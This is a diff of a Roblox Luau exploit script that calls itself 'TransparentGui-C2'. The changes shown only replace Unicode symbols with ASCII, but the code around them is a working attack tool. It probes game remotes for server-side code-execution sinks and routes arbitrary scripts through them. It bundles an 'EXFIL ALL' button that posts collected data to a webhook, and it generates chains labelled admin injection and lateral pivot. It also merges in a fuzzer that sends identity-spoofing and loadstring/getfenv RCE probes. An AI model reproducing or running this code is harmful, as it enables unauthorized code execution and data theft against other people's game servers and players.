         Enum.Font.GothamBold,7,Color3.fromRGB(0,210,200),
         Enum.TextXAlignment.Center,11)
     vmBtn.MouseEnter:Connect(function()
@@ -8122,7 +8122,7 @@ local function buildC2Page(page)
                     c2Log("VM",msg,col or Color3.fromRGB(0,210,200))
                 end,
                 function(found)
-                    vmLbl.Text="🔍 SCAN VMs"
+                    vmLbl.Text="[search] SCAN VMs"
                     vmLbl.TextColor3 = found
                         and Color3.fromRGB(255,60,80)
                         or  Color3.fromRGB(0,210,200)
@@ -8148,7 +8148,7 @@ local function buildC2Page(page)
                 end,
                 function(found)
                     if found then
-                        probeLbl.Text = "✓ SINK FOUND"
+                        probeLbl.Text = "[OK] SINK FOUND"
                         probeLbl.TextColor3 = Color3.fromRGB(255,60,80)
                         c2UpdateStatus("ACTIVE")
                         -- Update target label to show confirmed sink
@@ -8157,7 +8157,7 @@ local function buildC2Page(page)
                             c2TargetLbl.TextColor3 = Color3.fromRGB(255,60,80)
                         end
                     else
-                        probeLbl.Text = "⚡ PROBE ALL"
+                        probeLbl.Text = "** PROBE ALL"
                         probeLbl.TextColor3 = Color3.fromRGB(255,60,80)
                     end
                 end
@@ -8165,7 +8165,7 @@ local function buildC2Page(page)
         end)
     end)
 
-    -- ── Patch script console to route through confirmed sink ─────────────────
+    -- -- Patch script console to route through confirmed sink -----------------
     -- The execScriptBtn callback was set earlier; replace it here now that
     -- rceExec is defined.
     if execScriptBtn then
@@ -8177,10 +8177,10 @@ local function buildC2Page(page)
             task.delay(0.14, function() execScriptBtn.BackgroundTransparency = 1 end)
             if RCE.active then
                 -- Route through confirmed execution sink
-                c2Log("[→] RCE:"..scriptType:upper(), code:sub(1,48), C2_COL.OUT)
+                c2Log("[->] RCE:"..scriptType:upper(), code:sub(1,48), C2_COL.OUT)
                 RCE:exec(code, function(ok, result)
                     if ok then
-                        c2Log("[←] RESULT", result:sub(1,80), C2_COL.IN)
+                        c2Log("[<-] RESULT", result:sub(1,80), C2_COL.IN)
                         HTTP:capture("SERVER_RESPONSES","exec_"..os.date("%H%M%S"),
                             { code=code, result=result, sink=RCE.path })
                     else
@@ -8188,8 +8188,8 @@ local function buildC2Page(page)
                     end
                 end)
             else
-                -- No confirmed sink — fire through normal C2 target
-                c2Log("[→] EXEC:"..scriptType:upper(), code:sub(1,48), C2_COL.OUT)
+                -- No confirmed sink -- fire through normal C2 target
+                c2Log("[->] EXEC:"..scriptType:upper(), code:sub(1,48), C2_COL.OUT)
                 c2Send("EXEC:"..scriptType, { action="exec", type=scriptType, code=code })
             end
         end)
@@ -8197,14 +8197,14 @@ local function buildC2Page(page)
 
     c2Log("SYS","C2 command hub ready.",C2_COL.SYS)
     c2Log("SYS","CONNECT to a Remote or Ingress node to begin.",C2_COL.SYS)
-    c2Log("i","⚡ PROBE ALL scans every discovered remote for execution sinks.",C2_COL.INFO)
+    c2Log("i","** PROBE ALL scans every discovered remote for execution sinks.",C2_COL.INFO)
     c2Log("i","If a sink is found, script console routes directly through it.",C2_COL.INFO)
     c2Log("i","Probe uses 6 payload formats: RAW_STRING, CODE_KEY, EXEC_KEY,",C2_COL.INFO)
-    c2Log("i","ACTION_EVAL, ACTION_LOAD, EXPR_FIELD — covers all common patterns.",C2_COL.INFO)
+    c2Log("i","ACTION_EVAL, ACTION_LOAD, EXPR_FIELD -- covers all common patterns.",C2_COL.INFO)
 end
 
 
--- ─── HTTP FEEDBACK PAGE ──────────────────────────────────────────────────────
+-- --- HTTP FEEDBACK PAGE ------------------------------------------------------
 local function buildHttpFeedbackPage(page)
     page.ClipsDescendants = true
 
@@ -8225,18 +8225,18 @@ local function buildHttpFeedbackPage(page)
         f.Size = UDim2.new(1,0,0,1) return f
     end
 
-    -- ── PAGE HEADER ────────────────────────────────────────────────────────
+    -- -- PAGE HEADER --------------------------------------------------------
     local hdr = mF(page,0,0,0,HDR_H,Color3.new(0,0,0),TRANS,9)
     hdr.Size  = UDim2.new(1,0,0,HDR_H)
     mF(hdr,0,0,3,HDR_H,BLU,0.0,10)
     rule(hdr,HDR_H-1,BLU,10)
     mL(hdr,10,0,160,HDR_H,"HTTP FEEDBACK",
         Enum.Font.GothamBold,9,BLU,Enum.TextXAlignment.Left,10)
-    local rHdr=mL(hdr,0,0,0,HDR_H,"OUTBOUND  ·  EXFIL  ·  RESPONSES",
+    local rHdr=mL(hdr,0,0,0,HDR_H,"OUTBOUND  .  EXFIL  .  RESPONSES",
         Enum.Font.Gotham,7,DIM,Enum.TextXAlignment.Right,10)
     rHdr.Size=UDim2.new(1,-10,1,0)
 
-    -- ── LEFT PANE: FILE DIRECTORY ──────────────────────────────────────────
+    -- -- LEFT PANE: FILE DIRECTORY ------------------------------------------
     local lp = mF(page,0,HDR_H,TREE_W,0,Color3.new(0,0,0),TRANS,9)
     lp.Size  = UDim2.new(0,TREE_W,1,-HDR_H)
     mF(lp,TREE_W-1,0,1,0,SEP,0.45,10).Size=UDim2.new(0,1,1,0)
@@ -8298,7 +8298,7 @@ local function buildHttpFeedbackPage(page)
             local folderRow = mBtn(treeScroll,0,cy,TREE_W,ROW_H,
                 Color3.new(0,0,0),TRANS,10)
             mF(folderRow,0,0,3,ROW_H,cat.col,0.0,11)
-            mL(folderRow,6,0,14,ROW_H,exp and "▼" or "▶",
+            mL(folderRow,6,0,14,ROW_H,exp and "v" or ">",
                 Enum.Font.GothamBold,7,cat.col,Enum.TextXAlignment.Center,11)
             mL(folderRow,22,0,TREE_W-60,ROW_H,cat.label,
                 Enum.Font.GothamBold,8,cat.col,Enum.TextXAlignment.Left,11)
@@ -8330,7 +8330,7 @@ local function buildHttpFeedbackPage(page)
                         iRow.BackgroundTransparency=0.88
                     end
                     local isLast=(item==items[#items])
-                    mL(iRow,4,0,12,ITEM_H,isLast and "└" or "├",
+                    mL(iRow,4,0,12,ITEM_H,isLast and "+" or "+",
                         Enum.Font.Code,8,Color3.fromRGB(45,50,70),
                         Enum.TextXAlignment.Center,11)
                     mF(iRow,9,0,1,isLast and ITEM_H/2 or ITEM_H,
@@ -8368,7 +8368,7 @@ local function buildHttpFeedbackPage(page)
     end
     HTTP.treeRefresh=rebuildTree
 
-    -- ── RIGHT PANE: HTTP/S CONTROL HUB ────────────────────────────────────
+    -- -- RIGHT PANE: HTTP/S CONTROL HUB ------------------------------------
     local rp=mF(page,TREE_W+1,HDR_H,0,0,Color3.new(0,0,0),TRANS,9)
     rp.Size=UDim2.new(1,-(TREE_W+1),1,-HDR_H)
 
@@ -8435,7 +8435,7 @@ local function buildHttpFeedbackPage(page)
         end)
     end
     -- Row 1: GET FETCH  |  POST TEST  |  EXFILTRATE ALL
-    actionBtn("▼","GET FETCH",GRN,8,115,function()
+    actionBtn("v","GET FETCH",GRN,8,115,function()
         if HTTP.webhookUrl=="" then return end
         local ok,status,body,ms=HTTP:get(HTTP.webhookUrl)
         HTTP:capture("HTTP_REQUESTS","get_"..os.date("%H%M%S"),
@@ -8444,7 +8444,7 @@ local function buildHttpFeedbackPage(page)
             {status=status,ms=ms,body=body})
         task.spawn(rebuildTree)
     end)
-    actionBtn("◉","POST TEST",BLU,129,110,function()
+    actionBtn("o","POST TEST",BLU,129,110,function()
         if HTTP.webhookUrl=="" then return end
         local ok,status,body,ms=HTTP:post(HTTP.webhookUrl,{
             test=true, ts=os.date(), tool="TransparentGui-C2",
@@ -8454,7 +8454,7 @@ local function buildHttpFeedbackPage(page)
             {method="POST",url=HTTP.webhookUrl,status=status,ms=ms,response=body})
         task.spawn(rebuildTree)
     end)
-    actionBtn("▲","EXFIL ALL",CR,245,118,function()
+    actionBtn("^","EXFIL ALL",CR,245,118,function()
         local payload=HTTP:collect()
         HTTP:capture("EXFILTRATED","full_"..os.date("%H%M%S"),payload)
         if HTTP.webhookUrl~="" then
@@ -8472,7 +8472,7 @@ local function buildHttpFeedbackPage(page)
     getUrlBox.Position=UDim2.fromOffset(8,cy2)
     getUrlBox.BackgroundColor3=Color3.new(0,0,0)
     getUrlBox.BackgroundTransparency=0.78 getUrlBox.BorderSizePixel=0
-    getUrlBox.Text="" getUrlBox.PlaceholderText="Custom GET URL (optional — defaults to endpoint above)"
+    getUrlBox.Text="" getUrlBox.PlaceholderText="Custom GET URL (optional -- defaults to endpoint above)"
     getUrlBox.PlaceholderColor3=Color3.fromRGB(55,60,80)
     getUrlBox.TextColor3=GRN getUrlBox.Font=Enum.Font.Code getUrlBox.TextSize=8
     getUrlBox.ClearTextOnFocus=false getUrlBox.TextXAlignment=Enum.TextXAlignment.Left
@@ -8483,7 +8483,7 @@ local function buildHttpFeedbackPage(page)
     sendGetBtn.Position=UDim2.new(1,-70,0,cy2)
     mC(sendGetBtn,3) mS(sendGetBtn,GRN,0.50,1)
     mF(sendGetBtn,0,0,2,18,GRN,0.0,11)
-    mL(sendGetBtn,6,0,56,18,"▼  FETCH",Enum.Font.GothamBold,7,GRN,Enum.TextXAlignment.Left,11)
+    mL(sendGetBtn,6,0,56,18,"v  FETCH",Enum.Font.GothamBold,7,GRN,Enum.TextXAlignment.Left,11)
     sendGetBtn.MouseEnter:Connect(function()
         sendGetBtn.BackgroundColor3=GRN; sendGetBtn.BackgroundTransparency=0.82
     end)
@@ -8506,7 +8506,7 @@ local function buildHttpFeedbackPage(page)
     local clrHistBtn=mBtn(rp,8,cy2,100,18,Color3.new(0,0,0),1,10)
     mC(clrHistBtn,3) mS(clrHistBtn,Color3.fromRGB(55,60,80),0.60,1)
     mF(clrHistBtn,0,0,2,18,Color3.fromRGB(55,60,80),0.0,11)
-    mL(clrHistBtn,6,0,92,18,"✕  CLEAR HISTORY",Enum.Font.GothamBold,7,
+    mL(clrHistBtn,6,0,92,18,"x  CLEAR HISTORY",Enum.Font.GothamBold,7,
         Color3.fromRGB(55,60,80),Enum.TextXAlignment.Left,11)
     clrHistBtn.MouseEnter:Connect(function()
         clrHistBtn.BackgroundColor3=Color3.fromRGB(55,60,80)
@@ -8571,7 +8571,7 @@ local function buildHttpFeedbackPage(page)
             detailHdrLbl.Text="SELECT A FILE TO VIEW"
             detailSF.CanvasSize=UDim2.fromOffset(0,0) return
         end
-        detailHdrLbl.Text=item.name.."  ·  "..item.timestamp
+        detailHdrLbl.Text=item.name.."  .  "..item.timestamp
         local ok,json=pcall(function()
             return game:GetService("HttpService"):JSONEncode(item.data)
         end)
@@ -8616,12 +8616,12 @@ end
 
 
 
--- ═══════════════════════════════════════════════════════════════════════════════
+-- ===============================================================================
 -- AUTOMATED TRACE CHAIN GENERATOR
 -- Generates pre-built S->S and HPDC chains from live remote scans.
 -- Each "generation set" is a fully configured graph (nodes + wires + actions).
 -- User cycles through sets and applies/dumps them without rebuilding manually.
--- ═══════════════════════════════════════════════════════════════════════════════
+-- ===============================================================================
 HTTP.gen = {
     sets       = {},   -- { {tab, strategy, desc, nodes, wires}, ... }
     current    = 1,
@@ -8696,8 +8696,8 @@ function HTTP.gen:scanAll()
     return remotes, bindables
 end
 
--- ── S->S CHAIN TEMPLATES ──────────────────────────────────────────────────────
--- Each template: { strategy, desc, builder(remotes, bindables, idx) → nodeList }
+-- -- S->S CHAIN TEMPLATES ------------------------------------------------------
+-- Each template: { strategy, desc, builder(remotes, bindables, idx) -> nodeList }
 -- nodeList: { {typeId, actionIdx, x, y, value, remotePath} }
 -- typeId matches NODE_TYPES[i].id
 
@@ -8822,32 +8822,32 @@ HTTP.gen.ssTemplates = {
     },
 }
 
--- ── HPDC CHAIN TEMPLATES ──────────────────────────────────────────────────────
+-- -- HPDC CHAIN TEMPLATES ------------------------------------------------------
 HTTP.gen.hpdcTemplates = {
     { strategy="FULL CHAIN",
-      desc="Complete INGRESS→SERIAL→INTERSERVICE→REFLECT→LRCE pipeline",
+      desc="Complete INGRESS->SERIAL->INTERSERVICE->REFLECT->LRCE pipeline",
       nodes={{id="INGRESS",ai=1},{id="SERIAL",ai=1},{id="INTERSERVICE",ai=1},
              {id="REFLECT",ai=1},{id="LRCE",ai=1}} },
     { strategy="RAPID INGRESS",
-      desc="Short path: INGRESS→REFLECT→LRCE — bypasses serialization layer",
+      desc="Short path: INGRESS->REFLECT->LRCE -- bypasses serialization layer",
       nodes={{id="INGRESS",ai=2},{id="REFLECT",ai=3},{id="LRCE",ai=1}} },
     { strategy="SERIAL ATTACK",
-      desc="Targets deserialization: INGRESS→SERIAL→REFLECT→LRCE",
+      desc="Targets deserialization: INGRESS->SERIAL->REFLECT->LRCE",
       nodes={{id="INGRESS",ai=1},{id="SERIAL",ai=3},{id="REFLECT",ai=1},{id="LRCE",ai=2}} },
     { strategy="ADMIN INJECT",
-      desc="Direct admin flag injection via INGRESS→LRCE",
+      desc="Direct admin flag injection via INGRESS->LRCE",
       nodes={{id="INGRESS",ai=4},{id="LRCE",ai=1}} },
     { strategy="NETWORK PIVOT",
-      desc="Lateral pivot: INGRESS→INTERSERVICE→REFLECT→LRCE",
+      desc="Lateral pivot: INGRESS->INTERSERVICE->REFLECT->LRCE",
       nodes={{id="INGRESS",ai=2},{id="INTERSERVICE",ai=2},{id="REFLECT",ai=4},{id="LRCE",ai=3}} },
     { strategy="DESYNC CHAIN",
-      desc="State desynchronisation: INGRESS→SERIAL→INTERSERVICE→LRCE",
+      desc="State desynchronisation: INGRESS->SERIAL->INTERSERVICE->LRCE",
       nodes={{id="INGRESS",ai=3},{id="SERIAL",ai=2},{id="INTERSERVICE",ai=3},{id="LRCE",ai=4}} },
     { strategy="SCOPE LEAK",
-      desc="Environment escape: INGRESS→SERIAL→REFLECT(dynamic setter)→LRCE",
+      desc="Environment escape: INGRESS->SERIAL->REFLECT(dynamic setter)->LRCE",
       nodes={{id="INGRESS",ai=1},{id="SERIAL",ai=4},{id="REFLECT",ai=4},{id="LRCE",ai=5}} },
     { strategy="BROADCAST FLOOD",
-      desc="Framework broadcast abuse: INGRESS→INTERSERVICE→REFLECT→LRCE",
+      desc="Framework broadcast abuse: INGRESS->INTERSERVICE->REFLECT->LRCE",
       nodes={{id="INGRESS",ai=5},{id="INTERSERVICE",ai=4},{id="REFLECT",ai=2},{id="LRCE",ai=2}} },
 }
 
@@ -8974,7 +8974,7 @@ function HTTP.gen:apply(setIdx)
                 if node.actionLbl then
                     local shortName = nc.path:match("([^.]+)$") or nc.path
                     local prefix = (node.selectedAction and
-                        node.selectedAction.n .. "  ›  ") or ""
+                        node.selectedAction.n .. "  >  ") or ""
                     node.actionLbl.Text       = prefix .. shortName
                     node.actionLbl.TextColor3 = GC.MID
                 end
@@ -9135,17 +9135,17 @@ function HTTP.gen:showSwitcher()
     self.genLbl = mL(f,10,14,280,16,"GEN  1 / 0",
         Enum.Font.GothamBold,10,FR,Enum.TextXAlignment.Left,89)
 
-    self.stratLbl = mL(f,10,30,280,12,"—",
+    self.stratLbl = mL(f,10,30,280,12,"--",
         Enum.Font.GothamBold,8,Color3.fromRGB(215,220,240),
         Enum.TextXAlignment.Left,89)
 
-    self.descLbl = mL(f,10,44,280,14,"—",
+    self.descLbl = mL(f,10,44,280,14,"--",
         Enum.Font.Gotham,7,DIM,Enum.TextXAlignment.Left,89)
 
-    -- ◄ prev button
+    -- < prev button
     local prevBtn = mBtn(f,296,8,28,56,Color3.new(0,0,0),1,89)
     mC(prevBtn,4) mS(prevBtn,SEP,0.55,1)
-    mL(prevBtn,0,0,28,56,"◄",Enum.Font.GothamBold,12,DIM,
+    mL(prevBtn,0,0,28,56,"<",Enum.Font.GothamBold,12,DIM,
         Enum.TextXAlignment.Center,90)
     prevBtn.MouseEnter:Connect(function()
         prevBtn.BackgroundColor3=FR; prevBtn.BackgroundTransparency=0.85
@@ -9157,10 +9157,10 @@ function HTTP.gen:showSwitcher()
         self:apply(self.current)
     end)
 
-    -- ► next button
+    -- > next button
     local nextBtn = mBtn(f,328,8,28,56,Color3.new(0,0,0),1,89)
     mC(nextBtn,4) mS(nextBtn,SEP,0.55,1)
-    mL(nextBtn,0,0,28,56,"►",Enum.Font.GothamBold,12,DIM,
+    mL(nextBtn,0,0,28,56,">",Enum.Font.GothamBold,12,DIM,
         Enum.TextXAlignment.Center,90)
     nextBtn.MouseEnter:Connect(function()
         nextBtn.BackgroundColor3=FR; nextBtn.BackgroundTransparency=0.85
@@ -9175,7 +9175,7 @@ function HTTP.gen:showSwitcher()
     -- APPLY button
     local applyBtn = mBtn(f,360,8,28,26,Color3.new(0,0,0),1,89)
     mC(applyBtn,4) mS(applyBtn,GRN,0.50,1)
-    mL(applyBtn,0,0,28,26,"✓",Enum.Font.GothamBold,10,GRN,
+    mL(applyBtn,0,0,28,26,"[OK]",Enum.Font.GothamBold,10,GRN,
         Enum.TextXAlignment.Center,90)
     applyBtn.MouseEnter:Connect(function()
         applyBtn.BackgroundColor3=GRN; applyBtn.BackgroundTransparency=0.82
@@ -9188,7 +9188,7 @@ function HTTP.gen:showSwitcher()
     -- DUMP button
     local dumpBtn = mBtn(f,360,38,28,26,Color3.new(0,0,0),1,89)
     mC(dumpBtn,4) mS(dumpBtn,FR,0.50,1)
-    mL(dumpBtn,0,0,28,26,"✕",Enum.Font.GothamBold,10,FR,
+    mL(dumpBtn,0,0,28,26,"x",Enum.Font.GothamBold,10,FR,
         Enum.TextXAlignment.Center,90)
     dumpBtn.MouseEnter:Connect(function()
         dumpBtn.BackgroundColor3=FR; dumpBtn.BackgroundTransparency=0.82
@@ -9200,7 +9200,7 @@ function HTTP.gen:showSwitcher()
 
     -- Close
     local closeBtn = mBtn(f,PW-20,2,16,16,Color3.new(0,0,0),1,89)
-    mL(closeBtn,0,0,16,16,"×",Enum.Font.GothamBold,9,DIM,
+    mL(closeBtn,0,0,16,16,"x",Enum.Font.GothamBold,9,DIM,
         Enum.TextXAlignment.Center,90)
     closeBtn.MouseButton1Click:Connect(function()
         f:Destroy(); self.switcherFrm=nil
@@ -9261,7 +9261,7 @@ function HTTP.gen:showPrompt()
 
     -- Close
     local cx = mBtn(phdr,PW-20,6,14,14,Color3.new(0,0,0),1,94)
-    mL(cx,0,0,14,14,"×",Enum.Font.GothamBold,9,DIM,
+    mL(cx,0,0,14,14,"x",Enum.Font.GothamBold,9,DIM,
         Enum.TextXAlignment.Center,95)
     cx.MouseButton1Click:Connect(function() f:Destroy() end)
 
@@ -9301,7 +9301,7 @@ function HTTP.gen:showPrompt()
     local customBox=Instance.new("TextBox")
     customBox.Size=UDim2.fromOffset(60,18) customBox.Position=UDim2.fromOffset(82,82)
     customBox.BackgroundColor3=Color3.new(0,0,0) customBox.BackgroundTransparency=0.70
-    customBox.BorderSizePixel=0 customBox.Text="" customBox.PlaceholderText="1–20"
+    customBox.BorderSizePixel=0 customBox.Text="" customBox.PlaceholderText="1-20"
     customBox.PlaceholderColor3=DIM customBox.TextColor3=FR
     customBox.Font=Enum.Font.Code customBox.TextSize=10
     customBox.ClearTextOnFocus=false customBox.ZIndex=93 customBox.Parent=f
@@ -9353,7 +9353,7 @@ function HTTP.gen:showPrompt()
     mC(genBtn,6) mS(genBtn,GRN,0.30,1) mGlow(genBtn,GRN,0.60,2)
     mF(genBtn,0,0,3,38,GRN,0.0,94)
     mL(genBtn,10,0,PW-28,38,
-        "⚡  GENERATE CHAINS",
+        "**  GENERATE CHAINS",
         Enum.Font.GothamBold,11,GRN,Enum.TextXAlignment.Left,94)
     genBtn.MouseEnter:Connect(function()
         genBtn.BackgroundTransparency=0.60
@@ -9785,51 +9785,51 @@ end
 -- RUN
 playOpenAnimation()
 
--- ════════════════════════════════════════════════════════════════════
+-- ====================================================================
 --   DYNAMIC ANALYSIS LAYER  (merged module)
---   Everything below is the DAL — fuzzer, EBD, ingress mapper, race
+--   Everything below is the DAL -- fuzzer, EBD, ingress mapper, race
 --   scanner, and the 4-tab UI panel. It shares this script's Players,
 --   TweenService, and LocalPlayer references declared at the top.
--- ════════════════════════════════════════════════════════════════════
+-- ====================================================================
 
 --[[
-  ╔══════════════════════════════════════════════════════════════════════╗
-  ║   DAL.lua  —  Dynamic Analysis Layer  v1.0                         ║
-  ║   Part of: TransparentGui Security Tool                            ║
-  ║                                                                    ║
-  ║   Architecture: Three-tier sphere model                            ║
-  ║     Tier 1 — Static Graph Layer  (existing S→S tool)               ║
-  ║     Tier 2 — Dynamic Analysis Layer  (THIS FILE)                   ║
-  ║     Tier 3 — DALSink  (cross-session anomaly memory)               ║
-  ║                                                                    ║
-  ║   Two operating modes:                                             ║
-  ║     MODE 1  Logical Hunter   — challenges developer assumptions     ║
-  ║     MODE 2  RCE Probe        — hunts the data→instruction boundary ║
-  ║                                                                    ║
-  ║   Sub-systems:                                                     ║
-  ║     Crawler    — runtime remote discovery, periodic re-scan        ║
-  ║     Tagger     — trace IDs, identity fingerprinting                ║
-  ║     Fuzzer     — adaptive payload mutation (4 phases)              ║
-  ║     Snapshot   — differential state analysis (before / after)      ║
-  ║     Registry   — violation logging, severity scoring               ║
-  ║     EBD        — Execution Boundary Detector (Mode 2)              ║
-  ║     Ingress    — double-ingress / fleet-broadcast mapper           ║
-  ║     DALSink    — persistent anomaly sink                           ║
-  ║     UI         — integrated panel (4 tabs)                         ║
-  ║                                                                    ║
-  ║   Drop into StarterPlayerScripts as a LocalScript, OR             ║
-  ║   append directly after the existing TransparentGui_fixed.lua      ║
-  ║                                                                    ║
-  ║   Roblox Lua 5.1 compatible — no external dependencies            ║
-  ╚══════════════════════════════════════════════════════════════════════╝
+  +======================================================================+
+  |   DAL.lua  --  Dynamic Analysis Layer  v1.0                         |
+  |   Part of: TransparentGui Security Tool                            |
+  |                                                                    |
+  |   Architecture: Three-tier sphere model                            |
+  |     Tier 1 -- Static Graph Layer  (existing S->S tool)               |
+  |     Tier 2 -- Dynamic Analysis Layer  (THIS FILE)                   |
+  |     Tier 3 -- DALSink  (cross-session anomaly memory)               |
+  |                                                                    |
+  |   Two operating modes:                                             |
+  |     MODE 1  Logical Hunter   -- challenges developer assumptions     |
+  |     MODE 2  RCE Probe        -- hunts the data->instruction boundary |
+  |                                                                    |
+  |   Sub-systems:                                                     |
+  |     Crawler    -- runtime remote discovery, periodic re-scan        |
+  |     Tagger     -- trace IDs, identity fingerprinting                |
+  |     Fuzzer     -- adaptive payload mutation (4 phases)              |
+  |     Snapshot   -- differential state analysis (before / after)      |
+  |     Registry   -- violation logging, severity scoring               |
+  |     EBD        -- Execution Boundary Detector (Mode 2)              |
+  |     Ingress    -- double-ingress / fleet-broadcast mapper           |
+  |     DALSink    -- persistent anomaly sink                           |
+  |     UI         -- integrated panel (4 tabs)                         |
+  |                                                                    |
+  |   Drop into StarterPlayerScripts as a LocalScript, OR             |
+  |   append directly after the existing TransparentGui_fixed.lua      |
+  |                                                                    |
+  |   Roblox Lua 5.1 compatible -- no external dependencies            |
+  +======================================================================+
 --]]
 
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 --   SERVICES
 --   Players, TweenService, LocalPlayer already declared near the top
 --   of the merged script. Only RunService is new here.
--- ══════════════════════════════════════════════════════════════════
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
+-- ==================================================================
 --   REGISTER-LIMIT FIX: the main chunk (this whole script) is itself
 --   one Luau function, capped at 200 local registers. The original
 --   tool already used a large share of that budget before DAL was
@@ -9842,13 +9842,13 @@ playOpenAnimation()
 --   200-register budget, completely separate from the main chunk's.
 --   Only the single returned DAL table costs the main chunk a
 --   register, instead of every internal helper and local DAL uses.
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 local DAL = (function()
 local RunService = game:GetService("RunService")
 
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 --   SEVERITY LEVELS
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 local SEV = {
     INFO     = { label = "INFO",     score = 1, col = Color3.fromRGB(110, 125, 165) },
     LOW      = { label = "LOW",      score = 2, col = Color3.fromRGB( 90, 180, 255) },
@@ -9858,9 +9858,9 @@ local SEV = {
     RCE      = { label = "SB-RCE",   score = 6, col = Color3.fromRGB(200,  40, 220) },
 }
 
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 --   VIOLATION TYPES
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 local VTYPE = {
     LOGIC_BYPASS     = "Logic Bypass",
     STATE_SPOOF      = "State Spoofing",
@@ -9872,14 +9872,14 @@ local VTYPE = {
     RCE_BOUNDARY     = "SB-RCE Boundary",
 }
 
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 --   MUTATION LIBRARY
 --   Each entry: { label = string, payload = any }
 --   Organised into phases matching the four vulnerability classes
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 local MUTATIONS = {}
 
--- Phase 1 — Type Confusion  (Vulnerability class 1: Serialization Trap)
+-- Phase 1 -- Type Confusion  (Vulnerability class 1: Serialization Trap)
 MUTATIONS.TYPE_CONFUSION = {
     { label = "NaN",            payload = 0/0            },
     { label = "Infinity",       payload = math.huge       },
@@ -9894,7 +9894,7 @@ MUTATIONS.TYPE_CONFUSION = {
     { label = "Nil-key Table",  payload = { [false] = 1 } },
 }
 
--- Phase 2 — Deep Nesting  (stress-tests recursive handlers)
+-- Phase 2 -- Deep Nesting  (stress-tests recursive handlers)
 local function buildNested(depth)
     if depth <= 0 then return { probe = "DEEP_TERMINAL" } end
     return { n = buildNested(depth - 1) }
@@ -9905,7 +9905,7 @@ MUTATIONS.DEEP_NEST = {
     { label = "Depth-50", payload = buildNested(50) },
 }
 
--- Phase 3 — Identity Substitution  (Vulnerability class B: Identity Loss)
+-- Phase 3 -- Identity Substitution  (Vulnerability class B: Identity Loss)
 --   Built at runtime so it captures current server population
 local function buildIdentityMutations()
     local out = {
@@ -9925,10 +9925,10 @@ local function buildIdentityMutations()
     return out
 end
 
--- Phase 4 — RCE Environment Probes  (Mode 2 only — non-destructive)
+-- Phase 4 -- RCE Environment Probes  (Mode 2 only -- non-destructive)
 --   These are read-only environment checks. They do not execute, alter,
 --   or destroy anything. If the server echoes any result back, that
---   confirms the string was treated as an instruction — the ledge.
+--   confirms the string was treated as an instruction -- the ledge.
 MUTATIONS.RCE_PROBES = {
     { label = "loadstring-check", payload = "tostring(type(loadstring))"    },
     { label = "getfenv-check",    payload = "tostring(type(getfenv))"       },
@@ -9939,9 +9939,9 @@ MUTATIONS.RCE_PROBES = {
     { label = "code-table",       payload = { __code = "return game.PlaceId", __type = "probe" } },
 }
 
--- ══════════════════════════════════════════════════════════════════
---   DALSink SINK  —  Tier 3: persistent cross-session anomaly memory
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
+--   DALSink SINK  --  Tier 3: persistent cross-session anomaly memory
+-- ==================================================================
 local DALSink = {
     log     = {},
     MAX_LOG = 500,
@@ -9960,13 +9960,13 @@ function DALSink:clear()
     if self.onEntry then self.onEntry(nil) end
 end
 
--- ══════════════════════════════════════════════════════════════════
---   DAL  —  Tier 2: Dynamic Analysis Layer
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
+--   DAL  --  Tier 2: Dynamic Analysis Layer
+-- ==================================================================
 local DAL = {
-    -- Discovered remotes:  path → record
+    -- Discovered remotes:  path -> record
     discovered   = {},
-    -- Active probes:       traceId → probe
+    -- Active probes:       traceId -> probe
     activeProbes = {},
     -- Violation log (newest first)
     violations   = {},
@@ -9985,16 +9985,16 @@ local DAL = {
     onDiscovery = nil,
 }
 
--- ── Trace ID generator ────────────────────────────────────────────
+-- -- Trace ID generator --------------------------------------------
 local _traceSeq = 0
 local function newTraceId(suffix)
     _traceSeq = _traceSeq + 1
     return string.format("TR-%04d-%s", _traceSeq, (suffix or "???"):sub(-6))
 end
 
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 --   VIOLATION REGISTRY
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 function DAL:logViolation(vtype, severity, remotePath, payload, evidence, traceId)
     local v = {
         id         = string.format("V%04d", #self.violations + 1),
@@ -10004,7 +10004,7 @@ function DAL:logViolation(vtype, severity, remotePath, payload, evidence, traceI
         remotePath = remotePath  or "unknown",
         payload    = tostring(payload):sub(1, 100),
         evidence   = evidence    or "No evidence recorded",
-        traceId    = traceId     or "—",
+        traceId    = traceId     or "--",
         mode       = self.mode,
     }
     table.insert(self.violations, 1, v)
@@ -10032,12 +10032,12 @@ function DAL:clearViolations()
     if self.onViolation then self.onViolation(nil) end
 end
 
--- ══════════════════════════════════════════════════════════════════
---   STATE SNAPSHOT  —  Differential State Analysis
+-- ==================================================================
+--   STATE SNAPSHOT  --  Differential State Analysis
 --   Captures every observable client-side value before a probe fires,
 --   then diffs it after the server responds. Any unexpected change in
 --   an unrelated value flags a Lateral Transport Trust hole.
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 local function captureSnapshot()
     local snap = { ts = tick(), values = {} }
 
@@ -10098,21 +10098,21 @@ end
 local function diffToString(diffs)
     local parts = {}
     for _, d in ipairs(diffs) do
-        table.insert(parts, d.key .. ": " .. d.before .. " → " .. d.after)
+        table.insert(parts, d.key .. ": " .. d.before .. " -> " .. d.after)
     end
     return table.concat(parts, " | ")
 end
 
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 --   SERVER RESPONSE HANDLER
 --   Attached as OnClientEvent listener on every discovered remote.
 --   Receives whatever the server fires back and runs three checks:
 --     1. RCE execution signature detection  (Mode 2)
 --     2. Differential state analysis
 --     3. Marks the active probe as resolved (stops silent-proc timer)
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 
--- RCE execution signatures — strings the server should NEVER echo
+-- RCE execution signatures -- strings the server should NEVER echo
 -- back unless it tried to execute the probe as code
 local RCE_SIGNATURES = {
     "LS_PROBE_7f3a",     -- our sentinel string
@@ -10141,7 +10141,7 @@ function DAL:_onServerResponse(remotePath, ...)
             probe.responseArgs     = args
             probe.responseTs       = tick()
 
